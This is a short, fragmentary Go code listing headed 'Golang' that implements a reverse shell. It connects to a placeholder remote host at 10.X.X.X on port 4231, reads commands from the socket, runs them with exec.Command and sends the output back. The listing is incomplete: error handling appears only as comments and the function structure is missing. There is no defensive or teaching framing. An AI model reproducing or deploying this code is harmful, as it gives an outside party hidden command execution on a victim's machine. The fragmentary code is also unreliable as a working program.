# Golang

"bufio" // for reading from the socket

"net" // for creating a socket connection

"os/exec" // for running commands

"strings" // for trimming whitespace from input

"strconv" // for converting the port number to a string

REMOTE\_HOST = "10.X.X.X" // the IP address of the remote host

REMOTE\_PORT = 4231 // the port to connect to on the remote host

// Connect to the remote host

conn, err := net.Dial("tcp", REMOTE\_HOST+":"+strconv.Itoa(REMOTE\_PORT))

// If there was an error, panic

// Defer closing the connection until the function returns

println("Connected to remote host.")

println("Awaiting command...")

// Read a message from the remote host

message, err := bufio.NewReader(conn).ReadString('\n')

// If there was an error, panic

// Trim leading and trailing whitespace from the message

message = strings.TrimSpace(message)

println("Running command:", message)

cmd := exec.Command(message)

output, err := cmd.CombinedOutput()

println("Error running command:", err)

println("Sending response...")

// Send the output and error messages back to the remote host
